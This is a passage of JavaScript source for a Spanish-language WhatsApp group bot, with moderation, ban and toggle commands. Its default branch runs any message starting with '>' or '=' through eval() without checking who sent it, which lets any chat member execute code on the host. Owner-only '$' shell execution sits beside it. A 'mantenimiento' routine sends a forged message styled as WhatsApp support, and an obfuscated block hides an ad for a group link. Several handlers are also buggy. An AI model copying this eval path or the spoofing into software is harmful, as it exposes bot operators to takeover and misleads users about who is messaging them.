if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isAntiMedia) return reply('*Ya está activo*')          
	antimedia.push(from)                          
	fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))      
	reply(`*[ Activado ]*`)  
	reply(`*La persona que envie fotos o videos sera eliminada*`)  
} else if (args[0] === '0') {             
	var ini = antimedia.indexOf(from)
	antimedia.splice(ini, 1)           
	fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break

case 'antifake':                
if (!isWelkom) return reply('*Este comando solo se puede usar cuando la bienvenida esta activada*')
if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)     
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isAntiFake) return reply('*Ya está activo*')          
	antifake.push(from)                          
	fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))      
	reply(`*[ Activado ]*`)  
	reply(`*Los numeros considerados como FAKEs, sera eliminados del grupo*`)  
} else if (args[0] === '0') {             
	var ini = antifake.indexOf(from)
	antifake.splice(ini, 1)           
	fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break
case 'banchat':
if (!itsMe) return reply('🤔')
if (args.length < 1) return reply('*Amm... para activar usa *1* y para desactivar *0*')
if (body.endsWith('1')) {
if (isBanChat) return reply('Este chat ya ah estado baneado!')
chatban.push(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
reply('*♻Este chat a sido baneado*')
} else if (body.endsWith('0')) {
chatban.splice(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
reply('*♻Este chat a dejado de ser baneado*')
} else {
reply(`Porfavor escriba bien el comando: ${prefix}banchat *0/1*`)
}
break
case 'ban':
if (!itsMe) return reply(mess.only.ownerB)
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
addBanned(mentioned[0], args[1], ban)
}
mentions(`@${mentioned[0].split('@')[0]} Usted a sido baneado, lo que significa que no podra usar el bot!`, mentioned, true)
} else if (isQuotedMsg) {
if (quotedMsg.sender.match('529984907794')) return reply(`🤨`)
addBanned(quotedMsg.sender, args[1], ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido baneado, lo que significa que no podra usar el bot!`, mentioned, true)
} else if (!isNaN(args[1])) {
addBanned(args[1] + '@s.whatsapp.net', args[2], ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido baneado, lo que significa que no podra usar el bot!`, mentioned, true)
}
break
                
case 'unban':
if (!itsMe) return reply(mess.only.owner)
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
unBanned(mentioned[i], ban)
}
mentions(`@${mentioned[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentioned, true)
}if (isQuotedMsg) {
unBanned(quotedMsg.sender, ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentioned, true)
} else if (!isNaN(args[0])) {
unBanned(args[0] + '@s.whatsapp.net', ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentioned, true)
}
break
		
case '+18':                
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     

if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isNsfw) return reply('*Ya está activo*')          
	nsfw.push(from)                          
	fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))      
	reply(`*[ Activado ]*`)   
} else if (args[0] === '0') {             
	var ini = nsfw.indexOf(from)
	nsfw.splice(ini, 1)           
	fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break
//by Sm330
case 'autostick':            
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     
if (args.length < 1) return reply('Escribe *1* para activar')                    
if (args[0] === '1') {                             
	if (isAutoSt) return reply('*Ya está activo*')          
	autostick.push(from)             
	fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
	reply(`*[ Activado ]*`)  
	reply(`*ahora, todas las fotos que se envien en el grupo se convertiran en sticker automaticamente*`)  
} else if (args[0] === '0') {           
	var ini = autostick.indexOf(from)
	autostick.splice(ini, 1)                  
	fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
	reply(`Desactivado`)              
} else {                                
	reply('1 para activar, 0 para desactivar')        
}                          
break

case 'antibot':            
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     
if (args.length < 1) return reply('Escribe *1* para activar')                    
if (args[0] === '1') {                             
	if (isAntiBot) return reply('*Ya está activo*')          
	antibot.push(from)             
	fs.writeFileSync('./src/antibot.json', JSON.stringify(antibot))      
	reply(`*[ Activado ]*`)  
} else if (args[0] === '0') {           
	reply(`*AHORA....*\nCualquier otro Bot de Baileys sera eliminado!!`)  
	var ini = antibot.indexOf(from)
	antibot.splice(ini, 1)                  
	fs.writeFileSync('./src/antibot.json', JSON.stringify(antibot))      
	reply(`Desactivado`)              
} else {                                
	reply('1 para activar, 0 para desactivar')        
}                          
break
					
			case 'antibad':
                                        if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
                                        if (args.length < 1) return reply('Escribe *1* para activar')
                                        if (args[0] === '1') {
                                                if (isBadWord) return reply('*Ya está activo*')
                 	                        badword.push(from)
                 	                        fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
                  	                        reply(`*[ Activado ]*`)
						reply(`*Las personas que envien una mala palabra sera eliminada*. _Para ver la lista de malas palabras usa el comando: listbad_`)  
                                        } else if (args[0] === '0') {
                  	                        var ini = badword.indexOf(from)
						badword.splice(ini, 1)
                 	                        fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
                 	                        reply(`Desactivado`)
             	                        } else {
                 	                        reply('1 para activar, 0 para desactivar')
                	                }
                                        break
                                case 'addbad':
                                
                                        if (!isOwner) return reply(mess.only.ownerB)
                                        if (!isAdmin) return reply(mess.only.admin)
                                        if (args.length < 1) return reply( `Escribe ${prefix}addbad [palabra]. Ejemplo: ${prefix}addbad pto`)
                                        const bw = q
                                        bad.push(bw)
                                        fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
                                        reply('Se añadio con exito')
				
                                        break
                                case 'delbad':
                                
                                        if (!isOwner) return reply(mess.only.ownerB)
                                        if (!isAdmin) return reply(mess.only.admin)
                                        if (args.length < 1) return reply( `Escribe ${prefix}delbad [palabra]. Ejemplo: ${prefix}delbad bego`)
                                        let dbw = q
                                        bad.splice(dbw)
                                        fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
                                        reply('Se quito con exito')
				
                                        break 
                                case 'listbad':
                                
                                        let lbw = `Lista de BAD WORD\nTotal : ${bad.length}\n`
                                        for (let i of bad) {
                                                lbw += `◦ ${i.replace(bad)}\n`
                                        }
                                        await reply(lbw)
                                        break
					case 'antilink':
                                	if (!isGroup) return reply(mess.only.group)
					if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('escriba *1* para activar')
					if (args[0] === '1') {
						if (isAntiLink) return reply('Ya esta activo')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('*Anti-link activado ✔️*')
						samu330.sendMessage(from,`Los miembros que manden un link serán eliminados, *OJO* _CULAQUIER TIPO DE LINK_`, text)
					} else if ((args[0]) === '0') {
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('Anti-link desactivado ✔️')
					} else {
						reply('*1 para activar, 0 para desactivar*')
					}
					break
					case 'antigp':
                                	if (!isGroup) return reply(mess.only.group)
					if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('escriba *1* para activar')
					if (args[0] === '1') {
						if (isAntigp) return reply('Ya esta activo')
						antigp.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antigp))
						reply('*Anti-link de grupos activado ✔️*')
						samu330.sendMessage(from,`Los miembros que manden un link de otro grupo serán eliminados`, text)
					} else if ((args[0]) === '0') {
						var ini = antigp.indexOf(from)
						antigp.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antigp))
						reply('Anti-link de grupos desactivado ✔️')
					} else {
						reply('*1 para activar, 0 para desactivar*')
					}
					break
	case 'welcome':
					if (!isGroup) return reply('*Comando solo para grupos*')
					if (!isAdmin) return reply(mess.only.admin)
					if (args.length < 1) return reply('ah? que quieres hacer? *1* para activar y *2* para desactivar')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya esta activo')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Se activo con exito')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Se desactivo con exito')
					} else {
						reply('1 para activar, 0 desactivar')
					}
                                      break
	case 'simsimi':   
				if (!isGroup) return reply('Este comando es solo para grupos')  
					if (args.length < 1) return reply('escriba *1* para activar')        
					if (args[0] === '1') {                 
						if (isSimi) return reply('Ya esta activo')            
						simi.push(from)
                                                fs.writeFileSync('./src/simi.json', JSON.stringify(simi))
						reply('*Modo simi activado✅*')
					} else if ((args[0]) === '0') {                      
						var ini = simi.indexOf(from)              
						simi.splice(ini, 1)                    
						fs.writeFileSync('./src/simi.json', JSON.stringify(simi))        
						reply('Modo simsimi off ✔️')                                   
					} else {                               
						reply('*1 para activar, 0 para desactivar*')             
					}



default:
if (body.startsWith('>')){
            const util = require("util");
            konsol = budy.slice(1)
            Return = (sul) => {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined){
            bang = util.format(sul)
            }
            return reply(bang)
            }
            try {
            reply(`${util.format(eval(`;(async () => { ${konsol} })()`))}`)
            } catch(e){
            reply(`${String(e)}`)
            }}
if (body.startsWith("=")) {
return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
}


if (body.startsWith(`$`)){
if (!isOwner) return
const sep = budy.split("\n")
let exc = body.replace(sep[0]+"\n", "")
exec(exc, (err, stdout) => {
if (err) return samu330.sendMessage(from, `root @Sm330:~ ${err}`, MessageType.text, { quoted: sam })
if (stdout) {
reply(stdout)
}
})
}


if (body.contain('buenos dias')) {
dias = fs.readFileSync(`./temp/audio/wenas.mp3`)
samu330.sendMessage(from, dias, audio, {quoted: fliveLoc, mimetype: 'audio/mp4', ptt:true, duration: -999999})
}
if (body.includes(`@${botNumber}`)){
reply('*Epaaa...*')
}

function _0x5718(){var _0x1c4b44=['122885QdGzyn','sticker','137193xgROlL','1202160qgSFsZ','2169990GBfMeG','sendMessage','476319hkaInB','1006lwFJpo','12cilEll','447360sFDZtd','./src/ara.png','readFileSync','16biMglh','397bnmaIc','[\x20★\x20]\x20山姆\x20330'];_0x5718=function(){return _0x1c4b44;};return _0x5718();}function _0x4926(_0xab1c30,_0x37c62d){var _0x5718b9=_0x5718();return _0x4926=function(_0x49269b,_0x541901){_0x49269b=_0x49269b-0x65;var _0x2f5c1a=_0x5718b9[_0x49269b];return _0x2f5c1a;},_0x4926(_0xab1c30,_0x37c62d);}var _0x5b64d5=_0x4926;(function(_0x515af2,_0x3a3bbb){var _0x2d3808=_0x4926,_0x33a117=_0x515af2();while(!![]){try{var _0x544ce6=-parseInt(_0x2d3808(0x70))/0x1*(-parseInt(_0x2d3808(0x6a))/0x2)+-parseInt(_0x2d3808(0x69))/0x3+parseInt(_0x2d3808(0x6b))/0x4*(parseInt(_0x2d3808(0x72))/0x5)+-parseInt(_0x2d3808(0x6c))/0x6+parseInt(_0x2d3808(0x65))/0x7*(-parseInt(_0x2d3808(0x6f))/0x8)+parseInt(_0x2d3808(0x67))/0x9+-parseInt(_0x2d3808(0x66))/0xa;if(_0x544ce6===_0x3a3bbb)break;else _0x33a117['push'](_0x33a117['shift']());}catch(_0x4c558d){_0x33a117['push'](_0x33a117['shift']());}}}(_0x5718,0x1dbb9));body['includes']('xd')&&samu330[_0x5b64d5(0x68)](from,fs[_0x5b64d5(0x6e)]('./temp/xd.webp'),MessageType[_0x5b64d5(0x73)],{'quoted':sam,'contextInfo':{'externalAdReply':{'title':'🤠Los\x20que\x20no\x20dejan\x20el\x20xd:\x20\x27POR\x20AHI\x20NO!!\x27','body':_0x5b64d5(0x71),'sourceUrl':'https://chat.whatsapp.com/BGTQNDzESmEJr2cCJlccWV','thumbnail':fs[_0x5b64d5(0x6e)](_0x5b64d5(0x6d))}}});
		
//BY SAMU330 | Uso libre
if (body.includes('mantenimiento')) {
if (!itsMe) return
if (isGroup) return reply('Solo se puede usar en privados')
	
estadops = await samu330.getStatus(from)	
samu330.sendMessage(from, `*Numero de Usuario en formato completo:* ${from}
`, MessageType.text, {quoted: {key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": `web@support.whatsapp.com\n2022 © WhatsApp LLC\nPrivacidad y Seguridad.`, 'jpegThumbnail': fs.readFileSync('./src/ws.png')}}}
})	
}
		
if (isSimi && !itsMe &&  body != undefined){
ressimi = await getJson(`https://api.simsimi.net/v2/?text=${body}&lc=es&lang=es`)
reply(ressimi.success)
}
if (isAntiLink && body.includes('http') && !isAdmin) {
samu330.groupRemove(from, sender)
}
}
} catch (e) {
const emror = String(e)
if (emror.includes('convert')){ 
return
}
if (emror.includes('this.isZero')){ 
return
}	
if (emror.includes('fileLength')){                           
return
}
if (emror.includes('jid')){                           
return
}
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[  ERROR  ]"), chalk.keyword("red")(e))
}
})

